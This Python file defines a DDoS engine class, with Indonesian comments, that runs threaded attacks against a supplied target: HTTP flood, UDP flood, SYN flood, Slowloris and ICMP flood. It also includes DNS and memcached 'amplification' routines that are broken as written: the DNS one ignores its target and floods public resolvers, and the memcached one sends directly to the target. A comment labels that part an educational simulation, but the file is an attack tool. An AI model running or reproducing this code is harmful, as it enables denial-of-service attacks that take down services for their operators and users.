import threading
import socket
import random
import time
import requests
from scapy.all import IP, TCP, UDP, ICMP, send, Raw

class DDOSEngine:
    def __init__(self):
        self.attack_running = False
        self.attack_threads = []
        self.stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "current_target": None,
            "attack_type": None
        }
    
    # FITUR 1: HTTP FLOOD (Layer 7)
    def http_flood(self, target_url, duration=60, threads=50):
        def worker():
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    headers = {
                        'User-Agent': random.choice([
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
                            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'
                        ])
                    }
                    r = requests.get(target_url, headers=headers, timeout=1)
                    self.stats["packets_sent"] += 1
                    self.stats["bytes_sent"] += len(r.content)
                except:
                    self.stats["packets_sent"] += 1
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.start()
            self.attack_threads.append(t)
    
    # FITUR 2: UDP FLOOD (Layer 4)
    def udp_flood(self, target_ip, target_port, duration=60):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_running:
            try:
                sock.sendto(payload, (target_ip, target_port))
                self.stats["packets_sent"] += 1
                self.stats["bytes_sent"] += len(payload)
            except:
                pass
    
    # FITUR 3: SYN FLOOD (Layer 4)
    def syn_flood(self, target_ip, target_port, duration=60):
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_running:
            sport = random.randint(1024, 65535)
            packet = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags="S")
            send(packet, verbose=0)
            self.stats["packets_sent"] += 1
    
    # FITUR 4: SLOWLORIS (Layer 7)
    def slowloris(self, target_host, target_port=80, duration=60, sockets_count=200):
        sockets_list = []
        
        def init_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_host, target_port))
                s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target_host}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                return s
            except:
                return None
        
        for _ in range(sockets_count):
            s = init_socket()
            if s:
                sockets_list.append(s)
        
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_running:
            for s in list(sockets_list):
                try:
                    s.send(f"X-Header: {random.randint(1,5000)}\r\n".encode())
                    self.stats["packets_sent"] += 1
                except:
                    sockets_list.remove(s)
                    new_s = init_socket()
                    if new_s:
                        sockets_list.append(new_s)
            time.sleep(15)
    
    # FITUR 5: ICMP FLOOD (Layer 3)
    def icmp_flood(self, target_ip, duration=60):
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_running:
            packet = IP(dst=target_ip)/ICMP()/Raw(load=random._urandom(1472))
            send(packet, verbose=0)
            self.stats["packets_sent"] += 1
    
    # FITUR 6: DNS AMPLIFICATION
    def dns_amp(self, target_ip, duration=60):
        dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
            "208.67.222.222", "208.67.220.220"
        ]
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01'
        
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_running:
            for server in dns_servers:
                try:
                    sock.sendto(dns_query, (server, 53))
                    self.stats["packets_sent"] += 1
                except:
                    pass
    
    # FITUR 7: MEMCACHED AMPLIFICATION
    def memcached_amp(self, target_ip, target_port=11211, duration=60):
        # Mencari server memcached terbuka di internet
        # Ini adalah simulasi untuk tujuan edukasi
        payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_running:
            try:
                sock.sendto(payload, (target_ip, target_port))
                self.stats["packets_sent"] += 1
            except:
                pass
    
    def start_attack(self, attack_type, **kwargs):
        self.attack_running = True
        self.stats["current_target"] = kwargs.get('target')
        self.stats["attack_type"] = attack_type
        
        if attack_type == "http":
            t = threading.Thread(target=self.http_flood, args=(kwargs['target'],))
        elif attack_type == "udp":
            t = threading.Thread(target=self.udp_flood, args=(kwargs['target'], kwargs.get('port', 80)))
        elif attack_type == "syn":
            t = threading.Thread(target=self.syn_flood, args=(kwargs['target'], kwargs.get('port', 80)))
        elif attack_type == "slowloris":
            t = threading.Thread(target=self.slowloris, args=(kwargs['target'],))
        elif attack_type == "icmp":
            t = threading.Thread(target=self.icmp_flood, args=(kwargs['target'],))
        elif attack_type == "dns":
            t = threading.Thread(target=self.dns_amp, args=(kwargs['target'],))
        elif attack_type == "memcached":
            t = threading.Thread(target=self.memcached_amp, args=(kwargs['target'],))
        
        t.start()
        self.attack_threads = [t]
        return {"status": "attack_started", "type": attack_type}
    
    def stop_attack(self):
        self.attack_running = False
        for t in self.attack_threads:
            t.join(timeout=2)
        self.attack_threads = []
        return {"status": "attack_stopped"}
    
    def get_stats(self):
        return self.stats
